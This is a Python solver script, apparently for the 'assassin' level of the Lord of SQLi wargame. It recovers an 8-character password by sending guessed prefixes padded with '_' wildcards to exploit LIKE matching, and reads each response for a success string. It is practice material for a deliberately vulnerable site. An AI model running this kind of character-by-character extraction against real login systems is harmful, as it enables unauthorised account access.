import requests
from settings import session_id
from bs4_utils import print_html

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
cookies = {'PHPSESSID': session_id}


def get_pw():
    length = 8
    pw = str()
    for i in range(1, length + 1):
        for j in range(32, 127):
            if j == 37 or j == 95:
                continue

            # 현재 문자 추측
            payload = f"?pw={pw}{chr(j)}" + "_" * (length - i)
            res = requests.get(url + payload, cookies=cookies)

            # 비밀번호 매칭 조건 확인
            if "Hello guest" in res.text:
                pw += chr(j)  # 추측 성공
                print(chr(j), end=" ")
                break
    return pw


pw = get_pw()
print()
print("pw :", pw)
params = {
    'pw': pw
}
response = requests.get(url, params=params, cookies=cookies)
print_html(response.text)
